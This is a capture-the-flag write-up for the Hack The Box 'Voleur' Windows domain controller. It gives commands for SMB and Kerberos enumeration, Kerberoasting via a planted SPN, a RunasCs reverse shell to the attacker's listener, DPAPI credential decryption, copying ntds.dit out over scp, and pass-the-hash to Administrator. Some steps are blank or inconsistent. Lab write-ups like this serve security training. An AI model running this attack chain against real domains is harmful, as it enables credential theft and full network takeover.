# Voleur Windows Machine - HTB LABS

## Step 1: Enumeration
Start a nmap enumeration:
```
nmap -sV -T4 -Pn 10.129.244.23
```
<div align="center">
  <img src="https://github.com/10T4/write-up/blob/main/images/Image15.png" alt="d">
</div>

Screen result 
We have default credentials ryan.naylor / HollowOct31Nyt

don't forget to update your etc/hosts
```
echo "10.129.242.254 DC.voleur.htb voleur.htb DC" >> /etc/hosts
```

## step 2: Exploration
So with the result of nmap enumeration we can see that the port smb (139 & 445) is open, go explore the shares smb:
before check the auth:
```
nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
```
screen output


NTLM:False --> So we need a kerberos authentification, create your TGT ticket:
````
kinit ryan.naylor@VOLEUR.HTB

#list your ticket
klist
````

List the samba share 
````
smbclient.py VOLEUR.HTB/ryan.naylor@DC.voleur.htb -k -no-pass
````

In the share "IT" we found this file "Access_Review.xlsx"
download the file from your smb shell:
````
get Access_Review.xlsx
````

get the hash of the password of this file xlsx
````
office2john.py Access_Review.xlsx > hash.txt
````

````
hashcat 
````

Password: 

After open the file we found some creds of user & svc account

````
User Job Title Permissions Notes 
Ryan.Naylor First-Line Support Technician SMB Has Kerberos Pre-Auth disabled temporarily to test legacy systems. Marie.Bryant First-Line Support Technician SMB

Lacey.Miller Second-Line Support Technician Remote Management Users

TSupport Tecodd.Wolfe Second-Line hnician Remote Management Users
 
Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.

Jeremy.Combs Third-Line Support Technician Remote Management Users.
 
Has access to Software folder. Administrator Administrator Domain Admin

Not to be used for daily tasks! 

Service Accounts

svc_backup Windows Backup Speak to Jeremy! svc_ldap LDAP Services 
P/W - M1XyC9pW7qT5Vn 

svc_iis IIS Administration P/W - N5pXyW1VqM7CZ8 

svc_winrm Remote Management Need to ask Lacey as she reset this recently.
````

Now go use bloodhound to make view of users

<div align="center">
  <img src="https://github.com/10T4/write-up/blob/main/images/Image15.png" alt="d">
</div>

and we see that genericWrite is enable with the group Restore_Users@voleur.htb on Lacey.Miller and svc_winrm, so trying to set a new SPN on Lacey.Miller and use kerberoast attack to get the TGS:

create spn.ldif:
````
dn: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
changetype: modify
add: servicePrincipalName
servicePrincipalName: HTTP/fake.voleur.htb
-
````

Add the spn with ldapmodify:
ldapmodify -Y GSSAPI -H ldap://DC.voleur.htb -f spn.ldif

and display the TGSs of all SPN user

````
GetUserSPNs.py voleur.htb/svc_ldap -k -no-pass -dc-host DC.VOLEUR.HTB -request
````

try to decode the hash of Lacey.Miller

````
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
````

But it's a rabbit hole

Go now will try with svc_winrm account, we add spn et get the TGS hash and we get the password: 
```
AFireInsidedeOzarctica980219afi
```

get TGT and rce with evil-winrm:
````
kinit svc_winrm@VOLEUR.HTB
evil-winrm -i DC.voleur.htb -r voleur.htb
````

GET the USER FLAG:

PASSWORD

## Step 3: privilege escalation

Try to rotate user on evil winrm shell, to do this use RunAsCs.exe
https://github.com/antonioCoco/RunasCs

Note RunAsCs: Common tool used to execute commands with another user with credentials and without interactive session

with svc_winrm and same time on another shell:
```
.\RunasCs.exe svc_ldap "M1XyC9pW7qT5Vn" powershell -r 10.10.14.18:4444
nc -lnvp 4444
```

Now if you execute whoami you have swith user. Use this commands to restore the user todd.wolfe
```
$deletedObject = Get-ADObject -Filter {ObjectGUID -eq "1c6b1deb-c372-4cbb-87b1-15031de169db"} -IncludeDeletedObjects -Properties *
```
```
Restore-ADObject -Identity $deletedObject.DistinguishedName -TargetPath "OU=Second-Line Support Technicians,DC=voleur,DC=htb"
```

User restored successfuly, now create TGT with todd.wolfe & 

getTGT.py voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi -dc-ip 10.129.232.130
[*] Saving ticket in todd.wolfe.ccache

Return in smb shell with user todd.wolfe 

go search in IT

In AppData>Roaming>Microsoft>Credentials we found credential encrypted
In AppData>Roaming>Microsoft>

NOTE: Windows permet aux utilisateurs de sauvegarder des mots de passe (quand on coche "Se souvenir de mes identifiants"). Les credentials sont chiffré avec une key aléatoire, cette key aléatoire est chiffré avec une MATERKEY et cette MASTERKEY est chiffré avec le mot de passe de l'utilisateur actuel (todd.wolfe)

Now try to decrypt the key
First step: decrypt the Master key:
```
dpapi.py  masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```
Output:
```
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
````

Now Decrypt the aleatory key
```
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

New credential found:
jeremy.combs
qT3V9pLXyN7W4m

If we return in smbclient we found rsa private key "id_rsa" to svc_backup

We can try connect ssh with svc_backup account
```
ssh -i id_rsa svc_backup@voleur.htb -p 2222
```
In /mnt we found ntds.dit file, this file is used to store all hash of accounts
extract:
```
 scp -i id_rsa -p 2222 'svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active\ Directory/*' ./
 ```
 ```
scp -i id_rsa -p 2222 'svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/*' .
```
with the HASH of administrator got to create ticket and open session with evil-winrm

getTGT.py voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip 10.129.247.239

 export KRB5CCNAME=administrator.ccache

 evil-winrm -i DC.voleur.htb -r voleur.htb

 ROOT FLAG
